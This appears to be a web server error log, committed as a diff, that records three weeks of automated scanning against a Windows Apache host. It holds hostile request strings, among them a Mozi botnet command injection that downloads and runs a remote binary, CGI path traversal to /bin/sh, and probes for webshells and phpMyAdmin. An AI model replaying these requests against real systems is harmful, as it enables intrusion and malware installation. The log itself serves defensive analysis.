+[Sun May 14 00:50:13.198205 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sun May 14 02:40:44.980422 2023] [:error] [pid 4952:tid 1408] [client 45.55.34.212:52318] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sun May 14 04:45:50.657392 2023] [authz_core:error] [pid 4952:tid 1424] [client 200.63.105.184:49644] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/index.php
+[Sun May 14 04:45:51.626151 2023] [authz_core:error] [pid 4952:tid 1424] [client 200.63.105.184:49644] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/dbadmin
+[Sun May 14 04:45:53.364723 2023] [authz_core:error] [pid 4952:tid 1424] [client 200.63.105.184:49644] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/sqlmanager
+[Sun May 14 04:45:53.462245 2023] [authz_core:error] [pid 4952:tid 1424] [client 200.63.105.184:49644] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pma
+[Sun May 14 04:45:55.591605 2023] [authz_core:error] [pid 4952:tid 1424] [client 200.63.105.184:49644] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/mysqlmanager
+[Sun May 14 04:45:58.589330 2023] [authz_core:error] [pid 4952:tid 1424] [client 200.63.105.184:49644] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pma
+[Sun May 14 04:46:00.042348 2023] [authz_core:error] [pid 4952:tid 1424] [client 200.63.105.184:49644] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/sqlmanager
+[Sun May 14 04:46:01.206673 2023] [authz_core:error] [pid 4952:tid 1424] [client 200.63.105.184:50604] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pMA
+[Sun May 14 04:46:01.694936 2023] [authz_core:error] [pid 4952:tid 1424] [client 200.63.105.184:50604] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/web
+[Sun May 14 05:53:00.168058 2023] [:error] [pid 4952:tid 1324] [client 164.92.247.205:37626] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sun May 14 22:45:24.534953 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Mon May 15 03:17:13.944406 2023] [:error] [pid 4952:tid 1424] [client 143.110.180.42:34826] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Mon May 15 17:37:33.940133 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Mon May 15 20:26:51.180526 2023] [:error] [pid 4952:tid 1356] [client 159.223.51.0:33706] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Tue May 16 00:19:24.941467 2023] [:error] [pid 4952:tid 1424] [client 167.172.76.113:41906] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Tue May 16 12:55:45.505994 2023] [:error] [pid 4952:tid 1424] [client 51.15.127.227:36902] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 2, referer: http://174.92.84.68/services/
+[Tue May 16 12:55:45.505994 2023] [:error] [pid 4952:tid 1424] [client 51.15.127.227:36902] PHP Stack trace:, referer: http://174.92.84.68/services/
+[Tue May 16 12:55:45.505994 2023] [:error] [pid 4952:tid 1424] [client 51.15.127.227:36902] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://174.92.84.68/services/
+[Tue May 16 12:55:45.505994 2023] [:error] [pid 4952:tid 1424] [client 51.15.127.227:36902] PHP Notice:  Undefined index: Service in C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php on line 12, referer: http://174.92.84.68/services/
+[Tue May 16 12:55:45.505994 2023] [:error] [pid 4952:tid 1424] [client 51.15.127.227:36902] PHP Stack trace:, referer: http://174.92.84.68/services/
+[Tue May 16 12:55:45.505994 2023] [:error] [pid 4952:tid 1424] [client 51.15.127.227:36902] PHP   1. {main}() C:\\Galaxseeds\\Galaxseeds\\Web Server\\www\\services\\script.php:0, referer: http://174.92.84.68/services/
+[Tue May 16 20:02:51.106937 2023] [:error] [pid 4952:tid 1324] [client 167.99.188.234:51544] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Tue May 16 22:58:26.660377 2023] [:error] [pid 4952:tid 1324] [client 146.190.232.27:60424] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Wed May 17 05:49:35.087570 2023] [:error] [pid 4952:tid 1356] [client 165.232.177.55:49112] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Wed May 17 05:49:38.461984 2023] [:error] [pid 4952:tid 1356] [client 165.232.177.55:49164] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Wed May 17 06:12:11.875962 2023] [core:error] [pid 4952:tid 1324] [client 185.180.143.80:59686] AH00126: Invalid URI in request HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1
+[Wed May 17 14:11:36.995364 2023] [:error] [pid 4952:tid 1424] [client 80.82.78.39:57410] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/dns.php' not found or unable to stat
+[Wed May 17 23:27:20.114312 2023] [:error] [pid 4952:tid 1356] [client 188.166.78.172:37516] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Wed May 17 23:27:21.132135 2023] [:error] [pid 4952:tid 1356] [client 188.166.78.172:37570] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Thu May 18 03:18:48.626399 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu May 18 14:18:48.040752 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu May 18 20:33:16.592988 2023] [:error] [pid 4952:tid 1332] [client 165.22.196.88:60726] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Thu May 18 20:33:17.615993 2023] [:error] [pid 4952:tid 1332] [client 165.22.196.88:40082] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Fri May 19 04:31:38.591089 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri May 19 10:57:32.361828 2023] [core:error] [pid 4952:tid 1420] [client 152.89.196.144:46398] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Fri May 19 15:07:58.902188 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sat May 20 08:41:15.987828 2023] [:error] [pid 4952:tid 1396] [client 139.59.93.45:47218] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sat May 20 08:41:18.577513 2023] [:error] [pid 4952:tid 1396] [client 139.59.93.45:47288] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sat May 20 18:20:27.335283 2023] [:error] [pid 4952:tid 1396] [client 159.89.36.173:33854] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sat May 20 18:20:27.868721 2023] [:error] [pid 4952:tid 1396] [client 159.89.36.173:33896] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sat May 20 20:51:22.298032 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sun May 21 03:02:57.001638 2023] [core:error] [pid 4952:tid 1396] [client 45.94.210.106:44296] AH00126: Invalid URI in request k\xbb\x9dm\x0c\xed\xf1\xfb\xdaX\x11\xba\x9c\x15\xea\xa9\xebl\xd3V*\xa8\x8c\xd1\xa5\xc5\xa3g\xf3\xff\xe3\xd3j\xfd\xae\x05Hy\x1b\x07\xe1\xa6\xfa\xdf\x8b\x07\x1a\xc8\x0e\x9a6\xb7Kd\x85\x15Y\x19\x95
+[Sun May 21 03:19:41.901590 2023] [core:error] [pid 4952:tid 1396] [client 45.94.210.106:47876] AH00126: Invalid URI in request $\x0f\x88\x9d\xc6\x94\xdd<\xdc\x17\xbao\xa4JuGKQc\x04\x98z\x82|T\xcc\xa6\xc2\xacq\xe9\x14\xdf\xc7\xa0\xe6{\xea\x91uy{h\xb9\xa2uyO\xd7z\xb2\xb4\xc5\x11|C\x1ex*al\x86\x1a\xdb\xba\xfb\xd0\x93/\xed\xc5D\xb4\xbbb\xea\xb6y\xa09.L\xe8KT\x14\xb5\xd3(EDA\x7f`5\x94Q\xb7\xeb@\x97\x17&0K\x85y\xfcL\xbf\xcd!\x0e\xbfEL\xb1\xed69Y\xfe\x06Jy\xfd\xd59\xf5[(\xa9\xa9\xd6\x95B\x82\xb4\xcbmbXfq\xf1\x9d=\x1a\xc0\xff\xee\x9d\x9e\xb4\x84\xe9\x01\x9dA\xbdE/\x19\xa5\xb7S\x04'\x8f\x95\x8e\xd6O\x04\x1e\xc5r|\t\xa8\xdf\xa1\xac\xf8\x91Q
+[Sun May 21 04:16:35.062893 2023] [core:error] [pid 4952:tid 1396] [client 45.94.210.106:26446] AH00126: Invalid URI in request \x0f_z7\xd5\x87|\xd0/0x\xd2s}1\xf3h\xae\xb69\x8dCQ\xf5\xb7\xb6\x9d\x14t\x82W\xca\x02\xad\xc6\x11-'\xc8>\xaec0!D\xc1^%\x98Nn\xd9W\xbf\xfa\xd1\xf1\xb6\xed\x8b\x86e5\x0e\x03\xba|1\xf02\x8d\xf73\x1aJ\x92\x91$l\xcd<\xb3\xc2\vE\xdc\x13\xc8[r\x8c\xb8\xd1o\xcb\xba\xca\xcd\xc9M
+[Sun May 21 04:26:16.814925 2023] [core:error] [pid 4952:tid 1396] [client 45.94.210.106:23290] AH00126: Invalid URI in request \x9d\xe1\x18\xca\x1a\xce\x81C\v\xb1'doK\x85,\xe2\b8\x03'\xbep\xf6\xd7f\x87uv\xe3{+\xe0\x93\xda1\xcf\xe0[\xab\xd2\xbc\xef\x01\x1f
+[Sun May 21 04:28:36.196216 2023] [core:error] [pid 4952:tid 1396] [client 45.94.210.106:7546] AH00126: Invalid URI in request L\b\xaf\xc2.\x93e\x82\xb292\xd4\x18Gt\x19\xdb\x01h\x04\v4\xb3F^\xb5\xd3{/\xbc\x9e\xdf\xbe\xa4\xd1\xf7\x19\xb9
+[Sun May 21 06:30:10.102724 2023] [:error] [pid 4952:tid 1396] [client 5.188.210.227:63371] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun May 21 07:26:31.225264 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sun May 21 08:54:27.785687 2023] [:error] [pid 4952:tid 1396] [client 3.9.176.56:34030] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/index.html' not found or unable to stat
+[Sun May 21 14:14:15.611345 2023] [core:error] [pid 4952:tid 1348] [client 45.94.210.108:4480] AH00126: Invalid URI in request 9t\xb9\x1a\xc6\xf5\x0eP&\\3\xf5\xd2\x9b\x8e\\\xce\x8b!>\x16\xf3\x8e_8\xcdL+\xdb+\xf8\x9b\xaf\xbc\x8b\xea\xc7g\xa7N\xcd\xd6 \xe9v\xe4\xc5I\xb4\xafI\x02
+[Sun May 21 14:45:05.371534 2023] [core:error] [pid 4952:tid 1348] [client 45.94.210.108:13282] AH00126: Invalid URI in request j\xeb\xd47\xf9\xd5\xde\xa0\xae\x1e\x97\xd2?\x1cz\xcfX\xdaj\x9b*\x99"gJZ}\x0fc\xf2Or\xf9^-\xa2J6U\xf6rN\xcaU\x87D\x94Zb@p\xebu\x0c0\xa5\x92\x9d?D3\x03\xc7\xdfq\x15^^\xedB\xff\xbc6\x0e,~\xeeI\xe5>9B`X\x90\xe6\xc4\xca9!!9\xe4\xbe6\xaa\x97V\xc0x\x03\xda\xcar\xb6\xdfUk\xa7\x0f\xe38\xd6@\xe7\xa9\x85=\xedA\x1b\x13\xef\xcd\xac\\~\xbd\xa0
+[Sun May 21 14:50:10.049761 2023] [:error] [pid 4952:tid 1348] [client 138.197.145.115:45728] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sun May 21 14:50:10.331768 2023] [:error] [pid 4952:tid 1348] [client 138.197.145.115:45766] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sun May 21 15:05:22.388402 2023] [core:error] [pid 4952:tid 1348] [client 138.197.175.37:33668] AH00126: Invalid URI in request \xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xffx\\d9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff
+[Sun May 21 16:07:51.072500 2023] [core:error] [pid 4952:tid 1348] [client 45.94.210.108:3888] AH00126: Invalid URI in request \xe5\xeb\x1f\xa0/>U}\x90\xa5\xb3S'\xb9Oe\xbd\xc5\x10\xb8[\x96\xc9\xc2\xf7\xcd\x07\x11\xabUHn\x86-;\xdb2\xc4v\r\xd2B8\xf5\xd6\xe9i\xd3P\xe1\xe5\xd0\x16\xd3\x92\xc6\\@c\xd4\x9eblMc\xb8\xd5q
+[Mon May 22 02:24:55.220768 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Mon May 22 10:15:43.949643 2023] [:error] [pid 4952:tid 1380] [client 64.225.20.130:55688] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Mon May 22 10:15:44.247818 2023] [:error] [pid 4952:tid 1380] [client 64.225.20.130:55720] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Mon May 22 14:27:36.172608 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Mon May 22 19:12:56.205211 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Mon May 22 20:10:41.659065 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Mon May 22 23:38:01.420847 2023] [:error] [pid 4952:tid 1380] [client 174.138.4.249:41882] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Mon May 22 23:38:02.563653 2023] [:error] [pid 4952:tid 1380] [client 174.138.4.249:41930] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Tue May 23 07:32:20.236252 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Tue May 23 14:33:58.771911 2023] [:error] [pid 4952:tid 1380] [client 209.38.206.102:51876] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Tue May 23 14:33:59.862128 2023] [:error] [pid 4952:tid 1380] [client 209.38.206.102:51932] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Tue May 23 17:22:35.187873 2023] [core:error] [pid 4952:tid 1396] [client 117.211.36.234:38616] AH00126: Invalid URI in request 27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0
+[Tue May 23 20:21:54.963784 2023] [core:error] [pid 4952:tid 1388] [client 83.97.73.89:58746] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Wed May 24 02:02:43.324778 2023] [core:error] [pid 4952:tid 1388] [client 193.32.162.190:36904] AH00126: Invalid URI in request GET /../../mnt/mtd/Config/Account1 HTTP/1.1
+[Wed May 24 02:10:57.197249 2023] [:error] [pid 4952:tid 1396] [client 157.245.213.55:55996] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Wed May 24 02:10:57.523822 2023] [:error] [pid 4952:tid 1396] [client 157.245.213.55:56030] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Wed May 24 03:16:13.508037 2023] [core:error] [pid 4952:tid 1396] [client 193.32.162.190:53788] AH00126: Invalid URI in request GET /../../mnt/mtd/Config/Account2 HTTP/1.1
+[Wed May 24 06:26:43.733260 2023] [:error] [pid 4952:tid 1396] [client 68.183.23.28:36666] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Wed May 24 06:26:44.058238 2023] [:error] [pid 4952:tid 1396] [client 68.183.23.28:36708] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Wed May 24 22:53:44.518837 2023] [authz_core:error] [pid 4952:tid 1380] [client 82.170.148.96:57566] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/web
+[Wed May 24 22:53:50.688713 2023] [authz_core:error] [pid 4952:tid 1380] [client 82.170.148.96:57566] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/db
+[Wed May 24 22:53:51.309316 2023] [authz_core:error] [pid 4952:tid 1380] [client 82.170.148.96:57566] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/mysqlmanager
+[Wed May 24 22:53:52.561345 2023] [authz_core:error] [pid 4952:tid 1380] [client 82.170.148.96:57566] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/index.php
+[Wed May 24 22:53:52.928347 2023] [authz_core:error] [pid 4952:tid 1380] [client 82.170.148.96:57566] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/sqlmanager
+[Wed May 24 22:53:53.317143 2023] [authz_core:error] [pid 4952:tid 1380] [client 82.170.148.96:57566] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/admin
+[Wed May 24 22:53:55.660518 2023] [authz_core:error] [pid 4952:tid 1380] [client 82.170.148.96:57566] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/dbadmin
+[Wed May 24 22:53:56.326068 2023] [authz_core:error] [pid 4952:tid 1380] [client 82.170.148.96:58036] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pMA
+[Wed May 24 22:53:58.578109 2023] [authz_core:error] [pid 4952:tid 1380] [client 82.170.148.96:58036] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pma
+[Wed May 24 23:28:34.085636 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu May 25 14:02:25.967979 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri May 26 04:25:13.216357 2023] [core:error] [pid 4952:tid 1380] [client 83.97.73.89:56324] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Fri May 26 07:45:00.456499 2023] [:error] [pid 4952:tid 1388] [client 62.182.84.146:57864] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upload.php' not found or unable to stat
+[Fri May 26 07:45:09.872790 2023] [authz_core:error] [pid 4952:tid 1388] [client 62.182.84.146:53652] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/
+[Fri May 26 08:00:12.689635 2023] [authz_core:error] [pid 4952:tid 1388] [client 199.249.230.165:36966] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/wallet.dat
+[Fri May 26 09:15:41.301893 2023] [authz_core:error] [pid 4952:tid 1396] [client 104.194.11.54:57072] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/
+[Fri May 26 09:15:45.241407 2023] [authz_core:error] [pid 4952:tid 1396] [client 104.194.11.54:57072] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/asd
+[Fri May 26 09:49:43.730077 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri May 26 14:20:42.142502 2023] [:error] [pid 4952:tid 1396] [client 5.188.210.227:30708] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Fri May 26 20:06:45.254367 2023] [:error] [pid 4952:tid 1372] [client 165.232.185.77:39890] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Fri May 26 20:06:47.885306 2023] [:error] [pid 4952:tid 1372] [client 165.232.185.77:39938] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sat May 27 12:10:18.191722 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sun May 28 04:35:19.056903 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sun May 28 09:12:26.088093 2023] [core:error] [pid 4952:tid 1420] [client 185.213.175.62:34710] AH00126: Invalid URI in request GET stager64 HTTP/1.1
+[Sun May 28 12:59:37.955459 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sun May 28 18:50:59.948791 2023] [core:error] [pid 4952:tid 1396] [client 83.97.73.89:40414] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Sun May 28 20:08:35.141173 2023] [:error] [pid 4952:tid 1396] [client 142.93.226.175:54568] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sun May 28 20:08:36.263414 2023] [:error] [pid 4952:tid 1396] [client 142.93.226.175:54610] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Mon May 29 08:09:29.479261 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Tue May 30 06:39:13.485475 2023] [core:error] [pid 4952:tid 1380] [client 185.180.143.141:39594] AH00126: Invalid URI in request HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1
+[Tue May 30 18:24:58.531874 2023] [:error] [pid 4952:tid 1396] [client 164.90.128.121:56316] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Tue May 30 18:24:59.070931 2023] [:error] [pid 4952:tid 1396] [client 164.90.128.121:56372] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Wed May 31 03:35:19.418720 2023] [:error] [pid 4952:tid 1348] [client 143.110.216.250:57638] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Wed May 31 03:35:19.629750 2023] [:error] [pid 4952:tid 1348] [client 143.110.216.250:57676] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Wed May 31 07:24:31.123028 2023] [core:error] [pid 4952:tid 1348] [client 104.236.64.173:32850] AH00126: Invalid URI in request \xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xffx\\d9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff
+[Wed May 31 07:30:26.650017 2023] [core:error] [pid 4952:tid 1348] [client 83.97.73.89:59240] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Wed May 31 10:28:36.667068 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Wed May 31 22:59:38.216019 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Wed May 31 22:59:52.312215 2023] [core:error] [pid 4952:tid 1396] [client 164.52.36.213:34133] AH00126: Invalid URI in request GET  HTTP/1.1
+[Thu Jun 01 03:48:25.701563 2023] [core:error] [pid 4952:tid 1396] [client 83.97.73.89:44582] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Thu Jun 01 09:52:41.678558 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu Jun 01 16:53:03.874324 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu Jun 01 22:57:44.309843 2023] [:error] [pid 4952:tid 1348] [client 165.232.32.138:43096] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Thu Jun 01 22:57:45.457521 2023] [:error] [pid 4952:tid 1348] [client 165.232.32.138:48004] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Fri Jun 02 02:01:50.105505 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri Jun 02 06:33:57.796221 2023] [core:error] [pid 4952:tid 1348] [client 83.97.73.89:50944] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Fri Jun 02 19:08:52.269839 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri Jun 02 22:06:59.426652 2023] [:error] [pid 4952:tid 1420] [client 24.144.96.79:54198] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Fri Jun 02 22:06:59.833481 2023] [:error] [pid 4952:tid 1420] [client 24.144.96.79:54236] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sat Jun 03 02:01:32.668489 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sat Jun 03 02:02:55.972890 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sat Jun 03 05:44:12.655592 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sat Jun 03 15:44:44.268405 2023] [core:error] [pid 4952:tid 1420] [client 83.97.73.89:36700] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
